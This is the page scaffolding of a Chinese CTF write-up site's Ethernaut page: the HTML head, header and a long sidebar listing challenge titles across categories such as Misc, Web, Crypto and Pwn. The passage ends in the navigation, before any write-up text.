
<!doctype html>
<html lang="zh" class="no-js">
  <head>
    
      <meta charset="utf-8">
      <meta name="viewport" content="width=device-width,initial-scale=1">
      
      
        <meta name="author" content="YanhuiJessica">
      
      
        <link rel="canonical" href="https://yanhuijessica.github.io/Chictf-Writeups/wargames/ethernaut/">
      
      <link rel="icon" href="../../assets/images/favicon.png">
      <meta name="generator" content="mkdocs-1.4.2, mkdocs-material-8.3.3">
    
    
      
        <title>OpenZeppelinÔºöEthernaut - Chictf-Writeups</title>
      
    
    
  
      <link rel="stylesheet" href="../../assets/stylesheets/main.4a0965b7.min.css">
      
        
        <link rel="stylesheet" href="../../assets/stylesheets/palette.cbb835fc.min.css">
        
          
          
          <meta name="theme-color" content="#ffffff">
        
      
      
    
<style>
  .md-typeset h1 {
    color:var(--md-default-fg-color--light);
    font-size:2em;
    line-height:1.3;
    margin:0 0 1em;
  }
</style>

    
    
      
        
        
        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Fira+Sans:300,300i,400,400i,700,700i%7CFira+Mono:400,400i,700,700i&display=fallback">
        <style>:root{--md-text-font:"Fira Sans";--md-code-font:"Fira Mono"}</style>
      
    
    
    <script>__md_scope=new URL("../..",location),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
    
      

    
    
  </head>
  
  
    
    
    
    
    
    <body dir="ltr" data-md-color-scheme="" data-md-color-primary="white" data-md-color-accent="red">
  
    
    
    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
    <label class="md-overlay" for="__drawer"></label>
    <div data-md-component="skip">
      
        
        <a href="#0-hello-ethernaut" class="md-skip">
          Ë∑≥ËΩ¨Ëá≥
        </a>
      
    </div>
    <div data-md-component="announce">
      
    </div>
    
    
      

<header class="md-header" data-md-component="header">
  <nav class="md-header__inner md-grid" aria-label="È°µÁúâ">
    <a href="../.." title="Chictf-Writeups" class="md-header__button md-logo" aria-label="Chictf-Writeups" data-md-component="logo">
      
  
  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 3 1 9l11 6 9-4.91V17h2V9M5 13.18v4L12 21l7-3.82v-4L12 17l-7-3.82Z"/></svg>

    </a>
    <label class="md-header__button md-icon" for="__drawer">
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3V6m0 5h18v2H3v-2m0 5h18v2H3v-2Z"/></svg>
    </label>
    <div class="md-header__title" data-md-component="header-title">
      <div class="md-header__ellipsis">
        <div class="md-header__topic">
          <span class="md-ellipsis">
            Chictf-Writeups
          </span>
        </div>
        <div class="md-header__topic" data-md-component="header-topic">
          <span class="md-ellipsis">
            
              OpenZeppelinÔºöEthernaut
            
          </span>
        </div>
      </div>
    </div>
    
    
    
      <label class="md-header__button md-icon" for="__search">
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5Z"/></svg>
      </label>
      <div class="md-search" data-md-component="search" role="dialog">
  <label class="md-search__overlay" for="__search"></label>
  <div class="md-search__inner" role="search">
    <form class="md-search__form" name="search">
      <input type="text" class="md-search__input" name="query" aria-label="ÊêúÁ¥¢" placeholder="ÊêúÁ¥¢" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
      <label class="md-search__icon md-icon" for="__search">
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5Z"/></svg>
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12Z"/></svg>
      </label>
      <nav class="md-search__options" aria-label="Êü•Êâæ">
        
          <a href="javascript:void(0)" class="md-search__icon md-icon" aria-label="ÂàÜ‰∫´" data-clipboard data-clipboard-text="" data-md-component="search-share" tabindex="-1">
            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M18 16.08c-.76 0-1.44.3-1.96.77L8.91 12.7c.05-.23.09-.46.09-.7 0-.24-.04-.47-.09-.7l7.05-4.11c.54.5 1.25.81 2.04.81a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3c0 .24.04.47.09.7L8.04 9.81C7.5 9.31 6.79 9 6 9a3 3 0 0 0-3 3 3 3 0 0 0 3 3c.79 0 1.5-.31 2.04-.81l7.12 4.15c-.05.21-.08.43-.08.66 0 1.61 1.31 2.91 2.92 2.91 1.61 0 2.92-1.3 2.92-2.91A2.92 2.92 0 0 0 18 16.08Z"/></svg>
          </a>
        
        <button type="reset" class="md-search__icon md-icon" aria-label="Ê∏ÖÁ©∫ÂΩìÂâçÂÜÖÂÆπ" tabindex="-1">
          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12 19 6.41Z"/></svg>
        </button>
      </nav>
      
        <div class="md-search__suggest" data-md-component="search-suggest"></div>
      
    </form>
    <div class="md-search__output">
      <div class="md-search__scrollwrap" data-md-scrollfix>
        <div class="md-search-result" data-md-component="search-result">
          <div class="md-search-result__meta">
            Ê≠£Âú®ÂàùÂßãÂåñÊêúÁ¥¢ÂºïÊìé
          </div>
          <ol class="md-search-result__list"></ol>
        </div>
      </div>
    </div>
  </div>
</div>
    
    
      <div class="md-header__source">
        <a href="https://github.com/YanhuiJessica/Chictf-Writeups" title="ÂâçÂæÄ‰ªìÂ∫ì" class="md-source" data-md-component="source">
  <div class="md-source__icon md-icon">
    
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><!--! Font Awesome Free 6.1.1 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2022 Fonticons, Inc.--><path d="M439.55 236.05 244 40.45a28.87 28.87 0 0 0-40.81 0l-40.66 40.63 51.52 51.52c27.06-9.14 52.68 16.77 43.39 43.68l49.66 49.66c34.23-11.8 61.18 31 35.47 56.69-26.49 26.49-70.21-2.87-56-37.34L240.22 199v121.85c25.3 12.54 22.26 41.85 9.08 55a34.34 34.34 0 0 1-48.55 0c-17.57-17.6-11.07-46.91 11.25-56v-123c-20.8-8.51-24.6-30.74-18.64-45L142.57 101 8.45 235.14a28.86 28.86 0 0 0 0 40.81l195.61 195.6a28.86 28.86 0 0 0 40.8 0l194.69-194.69a28.86 28.86 0 0 0 0-40.81z"/></svg>
  </div>
  <div class="md-source__repository">
    YanhuiJessica/Chictf-Writeups
  </div>
</a>
      </div>
    
  </nav>
  
</header>
    
    <div class="md-container" data-md-component="container">
      
      
        
          
            
<nav class="md-tabs" aria-label="Ê†áÁ≠æ" data-md-component="tabs">
  <div class="md-tabs__inner md-grid">
    <ul class="md-tabs__list">
      
        
  
  


  
  
  
    <li class="md-tabs__item">
      <a href="../.." class="md-tabs__link">
        ÁÆÄ‰ªã
      </a>
    </li>
  

      
        
  
  


  
  
  
    <li class="md-tabs__item">
      <a href="../../misc/unpleasant_music/" class="md-tabs__link">
        Misc
      </a>
    </li>
  

      
        
  
  


  
  
  
    <li class="md-tabs__item">
      <a href="../../web/t_star_upload_bypass/" class="md-tabs__link">
        Web
      </a>
    </li>
  

      
        
  
  


  
  
  
    <li class="md-tabs__item">
      <a href="../../reverse/easyre/" class="md-tabs__link">
        Reverse
      </a>
    </li>
  

      
        
  
  


  
  
  
    <li class="md-tabs__item">
      <a href="../../pwn/when_did_you_born/" class="md-tabs__link">
        Pwn
      </a>
    </li>
  

      
        
  
  


  
  
  
    <li class="md-tabs__item">
      <a href="../../crypto/bank/" class="md-tabs__link">
        Crypto
      </a>
    </li>
  

      
        
  
  


  
  
  
    <li class="md-tabs__item">
      <a href="../../blockchain/code_is_law/" class="md-tabs__link">
        Blockchain
      </a>
    </li>
  

      
        
  
  
    
  


  
  
  
    <li class="md-tabs__item">
      <a href="../natas/" class="md-tabs__link md-tabs__link--active">
        Wargames
      </a>
    </li>
  

      
        
  
  


  
  
  
    <li class="md-tabs__item">
      <a href="../../eggs/ctfhub_index/" class="md-tabs__link">
        ÂΩ©Ëõã
      </a>
    </li>
  

      
    </ul>
  </div>
</nav>
          
        
      
      <main class="md-main" data-md-component="main">
        <div class="md-main__inner md-grid">
          
            
              
              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
                <div class="md-sidebar__scrollwrap">
                  <div class="md-sidebar__inner">
                    

  


<nav class="md-nav md-nav--primary md-nav--lifted" aria-label="ÂØºËà™Ê†è" data-md-level="0">
  <label class="md-nav__title" for="__drawer">
    <a href="../.." title="Chictf-Writeups" class="md-nav__button md-logo" aria-label="Chictf-Writeups" data-md-component="logo">
      
  
  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 3 1 9l11 6 9-4.91V17h2V9M5 13.18v4L12 21l7-3.82v-4L12 17l-7-3.82Z"/></svg>

    </a>
    Chictf-Writeups
  </label>
  
    <div class="md-nav__source">
      <a href="https://github.com/YanhuiJessica/Chictf-Writeups" title="ÂâçÂæÄ‰ªìÂ∫ì" class="md-source" data-md-component="source">
  <div class="md-source__icon md-icon">
    
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><!--! Font Awesome Free 6.1.1 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2022 Fonticons, Inc.--><path d="M439.55 236.05 244 40.45a28.87 28.87 0 0 0-40.81 0l-40.66 40.63 51.52 51.52c27.06-9.14 52.68 16.77 43.39 43.68l49.66 49.66c34.23-11.8 61.18 31 35.47 56.69-26.49 26.49-70.21-2.87-56-37.34L240.22 199v121.85c25.3 12.54 22.26 41.85 9.08 55a34.34 34.34 0 0 1-48.55 0c-17.57-17.6-11.07-46.91 11.25-56v-123c-20.8-8.51-24.6-30.74-18.64-45L142.57 101 8.45 235.14a28.86 28.86 0 0 0 0 40.81l195.61 195.6a28.86 28.86 0 0 0 40.8 0l194.69-194.69a28.86 28.86 0 0 0 0-40.81z"/></svg>
  </div>
  <div class="md-source__repository">
    YanhuiJessica/Chictf-Writeups
  </div>
</a>
    </div>
  
  <ul class="md-nav__list" data-md-scrollfix>
    
      
      
      

  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_1" type="checkbox" id="__nav_1" >
      
      
      
      
        <label class="md-nav__link" for="__nav_1">
          ÁÆÄ‰ªã
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" aria-label="ÁÆÄ‰ªã" data-md-level="1">
        <label class="md-nav__title" for="__nav_1">
          <span class="md-nav__icon md-icon"></span>
          ÁÆÄ‰ªã
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../.." class="md-nav__link">
        È¶ñÈ°µ
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../how_to_participate/" class="md-nav__link">
        Â¶Ç‰ΩïÂèÇ‰∏é
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

    
      
      
      

  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_2" type="checkbox" id="__nav_2" >
      
      
      
      
        <label class="md-nav__link" for="__nav_2">
          Misc
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" aria-label="Misc" data-md-level="1">
        <label class="md-nav__title" for="__nav_2">
          <span class="md-nav__icon md-icon"></span>
          Misc
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../misc/unpleasant_music/" class="md-nav__link">
        Unpleasant music
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../misc/leaf_cover_eyes/" class="md-nav__link">
        ‰∏ÄÂè∂ÈöúÁõÆ
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../misc/difficult_programming_language/" class="md-nav__link">
        Difficult Programming Language
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../misc/secret_information/" class="md-nav__link">
        Êú∫ÂØÜ‰ø°ÊÅØ
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../misc/hide_and_seek/" class="md-nav__link">
        ËóèËóèËóè
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../misc/targz_y1ng/" class="md-nav__link">
        TARGZ-y1ng
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../misc/gakki/" class="md-nav__link">
        gakki
      </a>
    </li>
  

            
          
            
              
  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_2_8" type="checkbox" id="__nav_2_8" >
      
      
      
      
        <label class="md-nav__link" for="__nav_2_8">
          HackerGame 2020
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" aria-label="HackerGame 2020" data-md-level="2">
        <label class="md-nav__title" for="__nav_2_8">
          <span class="md-nav__icon md-icon"></span>
          HackerGame 2020
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../misc/account_bot/" class="md-nav__link">
        ‰ªéÈõ∂ÂºÄÂßãÁöÑËÆ∞Ë¥¶Â∑•ÂÖ∑‰∫∫
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../misc/gibberish_message/" class="md-nav__link">
        ‰ªéÈõ∂ÂºÄÂßãÁöÑÁÅ´ÊòüÊñáÁîüÊ¥ª
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../misc/self_repeating_repeater/" class="md-nav__link">
        Ëá™Â§çËØªÁöÑÂ§çËØªÊú∫
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../misc/233_string_tool/" class="md-nav__link">
        233 ÂêåÂ≠¶ÁöÑÂ≠óÁ¨¶‰∏≤Â∑•ÂÖ∑
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../misc/233_docker/" class="md-nav__link">
        233 ÂêåÂ≠¶ÁöÑ Docker
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../misc/4f_system_middle/" class="md-nav__link">
        Êù•Ëá™‰∏ÄÊïôÁöÑÂõæÁâá
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../misc/basic_math_simulator/" class="md-nav__link">
        Ë∂ÖÂü∫Á°ÄÁöÑÊï∞ÁêÜÊ®°ÊãüÂô®
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../misc/stegano50/" class="md-nav__link">
        Stegano50
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../misc/newsctf_all_reverse/" class="md-nav__link">
        NEWSCTF - ÔºÅ‰∫ÜÂèçÈÉΩÔºå‰∫ÜÂèç
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../misc/audio_frequency_stego/" class="md-nav__link">
        audio-frequency-stego
      </a>
    </li>
  

            
          
            
              
  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_2_12" type="checkbox" id="__nav_2_12" >
      
      
      
      
        <label class="md-nav__link" for="__nav_2_12">
          DeconstruCT.F 2021
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" aria-label="DeconstruCT.F 2021" data-md-level="2">
        <label class="md-nav__title" for="__nav_2_12">
          <span class="md-nav__icon md-icon"></span>
          DeconstruCT.F 2021
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../misc/pirates/" class="md-nav__link">
        Pirates
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../misc/teg_rads/" class="md-nav__link">
        Teg Rads
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../misc/hearing_not_believing/" class="md-nav__link">
        HearingNotBelieving
      </a>
    </li>
  

            
          
            
              
  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_2_14" type="checkbox" id="__nav_2_14" >
      
      
      
      
        <label class="md-nav__link" for="__nav_2_14">
          HackerGame 2021
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" aria-label="HackerGame 2021" data-md-level="2">
        <label class="md-nav__title" for="__nav_2_14">
          <span class="md-nav__icon md-icon"></span>
          HackerGame 2021
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../misc/transparent_file/" class="md-nav__link">
        ÈÄèÊòéÁöÑÊñá‰ª∂
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../misc/encrypted_u_disk/" class="md-nav__link">
        Âä†ÂØÜÁöÑ U Áõò
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../misc/p_q/" class="md-nav__link">
        püò≠q
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

            
          
            
              
  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_2_15" type="checkbox" id="__nav_2_15" >
      
      
      
      
        <label class="md-nav__link" for="__nav_2_15">
          Ë•øÊπñËÆ∫Ââë 2021
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" aria-label="Ë•øÊπñËÆ∫Ââë 2021" data-md-level="2">
        <label class="md-nav__title" for="__nav_2_15">
          <span class="md-nav__icon md-icon"></span>
          Ë•øÊπñËÆ∫Ââë 2021
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../misc/yusa_little_secret/" class="md-nav__link">
        YUSAÁöÑÂ∞èÁßòÂØÜ
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../misc/yusa_secret/" class="md-nav__link">
        YusaÁöÑÁßòÂØÜ
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../misc/compress_the_flag/" class="md-nav__link">
        Compress The Flag
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../misc/s_script_gi/" class="md-nav__link">
        s/&lt;script&gt;//gi
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../misc/log4_sanity_check/" class="md-nav__link">
        Log 4 sanity check
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../misc/bishop_duel/" class="md-nav__link">
        Bishop Duel
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../misc/lighthouse/" class="md-nav__link">
        Lighthouse
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../misc/last_digit/" class="md-nav__link">
        last digit
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

    
      
      
      

  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_3" type="checkbox" id="__nav_3" >
      
      
      
      
        <label class="md-nav__link" for="__nav_3">
          Web
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" aria-label="Web" data-md-level="1">
        <label class="md-nav__title" for="__nav_3">
          <span class="md-nav__icon md-icon"></span>
          Web
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../web/t_star_upload_bypass/" class="md-nav__link">
        Êñá‰ª∂‰∏ä‰º† JS ÁªïËøá
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../web/t_star_tomcat/" class="md-nav__link">
        Â∞èÁå´Âí™Ë∏©ÁÅØÊ≥°
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../web/ctfhub_reflected_xss/" class="md-nav__link">
        CTFHub - ÂèçÂ∞ÑÂûã XSS
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../web/initiative/" class="md-nav__link">
        ‰∏ªÂä®
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../web/funhash/" class="md-nav__link">
        Funhash
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../web/xss_game/" class="md-nav__link">
        XSS Game
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../web/web_php_include/" class="md-nav__link">
        Web php include
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../web/ctfhub_git_leakage/" class="md-nav__link">
        CTFHub - Git Ê≥ÑÈú≤
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../web/newsctf_easy_web/" class="md-nav__link">
        NEWSCTF - easy_web
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../web/heres_a_flag/" class="md-nav__link">
        Here's a Flag
      </a>
    </li>
  

            
          
            
              
  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_3_11" type="checkbox" id="__nav_3_11" >
      
      
      
      
        <label class="md-nav__link" for="__nav_3_11">
          HackerGame 2021
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" aria-label="HackerGame 2021" data-md-level="2">
        <label class="md-nav__title" for="__nav_3_11">
          <span class="md-nav__icon md-icon"></span>
          HackerGame 2021
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../web/sale_melon/" class="md-nav__link">
        ÂçñÁìú
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../web/flag_red_packet/" class="md-nav__link">
        FLAG Âä©ÂäõÂ§ßÁ∫¢ÂåÖ
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../web/info_above_graph/" class="md-nav__link">
        Âõæ‰πã‰∏äÁöÑ‰ø°ÊÅØ
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../web/most_secure_crypto_algo/" class="md-nav__link">
        Most Secure Crypto Algo
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../web/calculus_calc_exercise/" class="md-nav__link">
        ÂæÆÁßØÂàÜËÆ°ÁÆóÂ∞èÁªÉ‰π†
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

    
      
      
      

  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_4" type="checkbox" id="__nav_4" >
      
      
      
      
        <label class="md-nav__link" for="__nav_4">
          Reverse
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" aria-label="Reverse" data-md-level="1">
        <label class="md-nav__title" for="__nav_4">
          <span class="md-nav__icon md-icon"></span>
          Reverse
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../reverse/easyre/" class="md-nav__link">
        EasyRe
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../reverse/z3/" class="md-nav__link">
        z3
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../reverse/newsctf_re_signin/" class="md-nav__link">
        NEWSCTF - re_signin
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

    
      
      
      

  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_5" type="checkbox" id="__nav_5" >
      
      
      
      
        <label class="md-nav__link" for="__nav_5">
          Pwn
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" aria-label="Pwn" data-md-level="1">
        <label class="md-nav__title" for="__nav_5">
          <span class="md-nav__icon md-icon"></span>
          Pwn
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../pwn/when_did_you_born/" class="md-nav__link">
        when did you born
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../pwn/amnesia/" class="md-nav__link">
        Amnesia
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

    
      
      
      

  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_6" type="checkbox" id="__nav_6" >
      
      
      
      
        <label class="md-nav__link" for="__nav_6">
          Crypto
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" aria-label="Crypto" data-md-level="1">
        <label class="md-nav__title" for="__nav_6">
          <span class="md-nav__icon md-icon"></span>
          Crypto
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../crypto/bank/" class="md-nav__link">
        bank
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../crypto/shanghai/" class="md-nav__link">
        shanghai
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../crypto/easy_rsa/" class="md-nav__link">
        easy_RSA
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../crypto/normal_rsa/" class="md-nav__link">
        Normal_RSA
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../crypto/easy_ecc/" class="md-nav__link">
        easy_ECC
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../crypto/fanfie/" class="md-nav__link">
        fanfie
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../crypto/jefferson_disk/" class="md-nav__link">
        ËΩ¨ËΩÆÊú∫Âä†ÂØÜ
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../crypto/code_modulate/" class="md-nav__link">
        ÁºñÁ†Å‰∏éË∞ÉÂà∂
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../crypto/ciscn_rsa/" class="md-nav__link">
        CISCN - rsa
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../crypto/opisthocomus_hoazin/" class="md-nav__link">
        opisthocomus-hoazin
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../crypto/stars_and_shapes/" class="md-nav__link">
        Stars and Shapes
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../crypto/he_thrusts_his_fists_against_the_post/" class="md-nav__link">
        He Thrusts His Fists Against the Post
      </a>
    </li>
  

            
          
            
              
  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_6_13" type="checkbox" id="__nav_6_13" >
      
      
      
      
        <label class="md-nav__link" for="__nav_6_13">
          PBCTF 2021
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" aria-label="PBCTF 2021" data-md-level="2">
        <label class="md-nav__title" for="__nav_6_13">
          <span class="md-nav__icon md-icon"></span>
          PBCTF 2021
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../crypto/alkaloid_stream/" class="md-nav__link">
        Alkaloid Stream
      </a>
    </li>
  

            
          
            
              
  
  
  
